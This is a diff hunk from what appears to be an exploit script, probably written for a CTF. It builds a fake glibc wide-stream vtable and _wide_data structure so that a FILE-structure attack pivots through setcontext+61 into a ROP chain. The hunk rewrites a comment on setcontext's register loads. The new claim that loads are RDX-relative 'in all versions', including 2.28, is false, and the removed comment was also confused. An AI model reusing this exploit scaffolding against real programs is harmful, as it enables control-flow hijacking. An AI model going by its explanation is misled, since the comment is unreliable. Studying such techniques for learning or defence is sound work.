@@ -72,12 +72,12 @@ fake_wide_vtable = flat({
     0x68: p64(libc.sym.setcontext + 61),  # __doallocate → setcontext
 })
 
-# setcontext loads registers from the ucontext struct it is called with:
-#   glibc >= 2.29: ucontext pointer in RDI (fp->_wide_data when reached via
-#     _IO_wdoallocbuf) — RSP from [rdi+0xa0], RIP from [rdi+0xa8],
-#     RDI (first argument) from [rdi+0x68].
-#   glibc <= 2.28: registers were loaded relative to RDX instead
-#     (RSP from [rdx+0xa0], RIP from [rdx+0xa8], RDI from [rdx+0x68]).
+# setcontext loads registers from the ucontext struct: __setcontext does
+#   pushq %rdi / popq %rdx, so every load is relative to RDX in all
+#   versions (2.28 and 2.39 alike) — RSP from [rdx+0xa0],
+#   RIP from [rdx+0xa8], RDI (first argument) from [rdx+0x68].
+#   (fp->_wide_data reaches setcontext as RDI via _IO_wdoallocbuf, but the
+#   register loads inside __setcontext itself use RDX.)
 # Place ROP chain at _wide_data structure:
 fake_wide_data = flat({
     0x18: p64(0),                     # _IO_write_base = 0
